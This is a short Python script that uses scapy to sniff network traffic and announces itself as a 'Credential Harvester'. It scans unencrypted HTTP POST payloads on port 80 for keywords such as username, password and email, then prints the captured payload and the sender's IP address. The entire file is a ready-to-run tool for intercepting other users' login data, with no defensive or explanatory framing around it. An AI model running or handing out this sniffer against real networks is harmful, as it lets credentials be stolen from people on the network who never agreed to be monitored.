from scapy.all import sniff, IP, TCP, Raw
import sys

# List of keywords to search for in packet payloads
KEYWORDS = ["username", "user", "login", "password", "pass", "email"]

def process_packet(packet):
    """
    This function processes each packet to find potential credentials.
    """
    # We only care about packets with an HTTP payload
    if not packet.haslayer(TCP) or not packet.haslayer(Raw):
        return
        
    # Check if it's likely HTTP traffic (usually on port 80)
    if packet[TCP].dport == 80 or packet[TCP].sport == 80:
        try:
            # Decode the raw payload from bytes to a string
            payload = packet[Raw].load.decode('utf-8', 'ignore')
            
            # Check if the payload contains a POST request (common for logins)
            if "POST" in payload:
                # Check if any of our keywords are in the payload
                if any(keyword in payload.lower() for keyword in KEYWORDS):
                    print("\n" + "="*50)
                    print(f"[+] Potential credentials found from {packet[IP].src}")
                    print(f"[+] Payload:\n{payload}")
                    print("="*50 + "\n")
                    # We found what we want, so we can exit.
                    # Remove the line below if you want to keep capturing.
                    sys.exit(0) 

        except Exception as e:
            # Pass on any decoding errors
            pass

def main():
    print("[*] Starting Credential Harvester...")
    print("[*] Waiting for HTTP POST requests...")
    
    # Sniff traffic on the network. The filter 'tcp' is more efficient.
    sniff(filter="tcp", prn=process_packet, store=0)

if __name__ == '__main__':
    main()